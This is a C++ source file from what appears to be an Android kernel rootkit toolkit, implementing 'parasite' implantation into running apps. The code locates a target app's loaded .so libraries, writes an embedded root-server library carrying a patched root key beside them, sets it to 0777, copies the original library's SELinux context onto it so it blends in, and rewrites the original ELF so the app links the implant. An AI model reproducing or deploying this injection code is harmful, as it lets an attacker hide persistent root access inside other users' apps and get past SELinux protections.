#include "kernel_root_kit_log.h"
#include "kernel_root_kit_command.h"
#include "kernel_root_kit_parasite_app.h"
#include "kernel_root_kit_process_cmdline_utils.h"
#include "kernel_root_kit_maps_helper.h"
#include "kernel_root_kit_lib_root_server_data.h"
#include "kernel_root_kit_parasite_patch_elf.h"
#include "../root_server/root_server_inline_key.h"
#include "../root_server/root_server_inline_so_name.h"
#include <string.h>
#include <iostream>
#include <fstream>
#include <memory>
#include <set>
#include <vector>
#include <filesystem>
#include <dirent.h>
#include <sys/stat.h> 
#include <sys/types.h>
#include <sys/xattr.h>

namespace kernel_root {
	
#ifndef XATTR_NAME_SELINUX
#define XATTR_NAME_SELINUX "security.selinux"
#endif

namespace {
	constexpr const char * arm64_key_folder = "/arm64";
	constexpr const char * arm32_key_folder = "/arm";

}

ssize_t parasite_precheck_app(const char* str_root_key, const char* target_pid_cmdline, std::set<std::string> &output_so_full_path) {
	if (kernel_root::get_root(str_root_key) != 0) {
		return -9901;
	}
	std::set<pid_t> pout;
	ssize_t err = kernel_root::find_all_cmdline_process(str_root_key, target_pid_cmdline, pout);
	if(err) {
		return err;
	}
	if(pout.size() == 0) {
		return -9902;
	}
	output_so_full_path.clear();
	bool exist_32bit = false;
	for(pid_t pid : pout) {
		std::set<std::string> current_so_paths = get_all_so_paths(pid);
		for (const std::string& path : current_so_paths) {
			if(!exist_32bit) {
				// check if it is a 32-bit application
				if (path.find(arm32_key_folder) != std::string::npos) {
                    exist_32bit = true;
                }
			}
			if (path.find(target_pid_cmdline) != std::string::npos && path.find(arm64_key_folder) != std::string::npos) {
				output_so_full_path.insert(path);
			}
		}
	}
	if(output_so_full_path.size() == 0 && exist_32bit) {
	    return -9903;
	}
	return 0;
}

//fork安全版本（可用于安卓APP直接调用）
ssize_t safe_parasite_precheck_app(const char* str_root_key, const char* target_pid_cmdline, std::set<std::string> &output_so_full_path) {
	fork_pipe_info finfo;
	if(fork_pipe_child_process(finfo)) {
		ssize_t ret = parasite_precheck_app(str_root_key, target_pid_cmdline, output_so_full_path);
		write_errcode_from_child(finfo, ret);
		write_set_string_from_child(finfo, output_so_full_path);
		_exit(0);
		return 0;
	}
	ssize_t err = 0;
	if(!wait_fork_child_process(finfo)) {
		err = -9911;
	} else {
		if(!read_errcode_from_child(finfo, err)) {
			err = -9912;
		}
		if(!read_set_string_from_child(finfo, output_so_full_path)) {
			err = -9913;
		}
	}
	return err;
}


bool replace_feature_string_in_buf(const char *feature_string_buf, size_t feature_string_buf_size, std::string_view new_string, char *buf, size_t buf_size) {
	bool write = false;
	std::shared_ptr<char> sp_new_feature(new (std::nothrow) char[feature_string_buf_size], std::default_delete<char[]>());
	if(sp_new_feature) {
		memset(sp_new_feature.get(), 0, feature_string_buf_size);
		size_t copy_len = new_string.length() < feature_string_buf_size - 1 ? new_string.length() : feature_string_buf_size - 1;
		strncpy(sp_new_feature.get(), new_string.data(), copy_len);

		for (size_t i = 0; i <= buf_size - feature_string_buf_size; i++) {
			char * desc = buf;
			desc += i;
			if (memcmp(desc, feature_string_buf, feature_string_buf_size) == 0) {
				memcpy(desc, sp_new_feature.get(), feature_string_buf_size);
				write = true;
				desc += feature_string_buf_size;
			}
		}
	}
	return write;
}

bool write_lib_implant_so_file(const char* str_root_key, const char* target_path) {
	std::shared_ptr<char> sp_lib_root_server_file_data(new (std::nothrow) char[kernel_root::lib_root_server_file_size], std::default_delete<char[]>());
	if(!sp_lib_root_server_file_data) {
		return false;
	}
	memcpy(sp_lib_root_server_file_data.get(), reinterpret_cast<char*>(kernel_root::lib_root_server_file_data), 
	kernel_root::lib_root_server_file_size);

	// write root key
	if(!replace_feature_string_in_buf(const_cast<char*>(static_inline_root_key), sizeof(static_inline_root_key), str_root_key, sp_lib_root_server_file_data.get(), kernel_root::lib_root_server_file_size)) {
		ROOT_PRINTF("write root key failed.\n");
		return false;
	}

	// write so name
	if(!replace_feature_string_in_buf(const_cast<char*>(static_inline_so_name), sizeof(static_inline_so_name), k_implant_so_name, sp_lib_root_server_file_data.get(), kernel_root::lib_root_server_file_size)) {
		ROOT_PRINTF("write so name failed.\n");
		return false;
	}

	// write out disk
    std::string str_target_path = target_path;
    std::ofstream file(str_target_path, std::ios::binary | std::ios::out);
    if (!file.is_open()) {
		ROOT_PRINTF("Could not open file %s.\n", str_target_path.c_str());
        return false;
    }
    file.write(sp_lib_root_server_file_data.get(), 
	kernel_root::lib_root_server_file_size);
    file.close();
    return true;
}

bool copy_selinux_context(const char* source_file_path, const char* target_file_path) {
    char selinux_context[512] = { 0 }; // adjust the size as per your requirement
    
	// Retrieve the SELinux context from the source file
	ssize_t length = getxattr(source_file_path, XATTR_NAME_SELINUX, selinux_context, sizeof(selinux_context));
    if (length == -1) {
        ROOT_PRINTF("getxattr error for source: %s. Error: %s\n", source_file_path, strerror(errno));
        return false;
    }
    selinux_context[length] = '\0'; // ensure null termination

    // Set the SELinux context to the target file
    if (setxattr(target_file_path, XATTR_NAME_SELINUX, selinux_context, strlen(selinux_context) + 1, 0)) {
        ROOT_PRINTF("setxattr error for target: %s. Error: %s\n", target_file_path, strerror(errno));
        return false;
    }

    return true;
}

ssize_t parasite_implant_app(const char* str_root_key, const char* target_pid_cmdline, const char* original_so_full_path) {
	if (kernel_root::get_root(str_root_key) != 0) {
		return -9921;
	}
	if(!std::filesystem::exists(original_so_full_path)) {
		return -9922;
	}
	std::filesystem::path path(original_so_full_path);
	std::string folder_path = path.parent_path().string();
	std::string implant_so_full_path = folder_path  + "/" + k_implant_so_name;
	remove(implant_so_full_path.c_str());
	if (!write_lib_implant_so_file(str_root_key, implant_so_full_path.c_str())) {
		return -9923;
	}
	if(!std::filesystem::exists(implant_so_full_path.c_str())) {
		return -9924;
	}
	if (chmod(implant_so_full_path.c_str(), 0777)) {
		return -9925;
	}
	if (!copy_selinux_context(original_so_full_path, implant_so_full_path.c_str())) {
		return -9926;
	}
	// Because it is in the same directory as the parasitized so, all you need to do here is fill in the file name of so
	if (!kernel_root::parasite_check_so_link(original_so_full_path, k_implant_so_name)) {
		return 0; //have already been linked
	}
	if (kernel_root::parasite_start_link_so(original_so_full_path, k_implant_so_name)) {
		return -9927;
	}
	 if (kernel_root::parasite_check_so_link(original_so_full_path, k_implant_so_name)) {
	 	return -9928;
	 }
	return 0;
}

ssize_t safe_parasite_implant_app(const char* str_root_key, const char* target_pid_cmdline, const char* original_so_full_path) {
	fork_pipe_info finfo;
	if(fork_pipe_child_process(finfo)) {
		ssize_t ret = parasite_implant_app(str_root_key, target_pid_cmdline, original_so_full_path);
		write_errcode_from_child(finfo, ret);
		_exit(0);
		return 0;
	}
	ssize_t err = 0;
	if(!wait_fork_child_process(finfo)) {
		err = -9931;
	} else {
		if(!read_errcode_from_child(finfo, err)) {
			err = -9932;
		}
	}
	return err;
}
}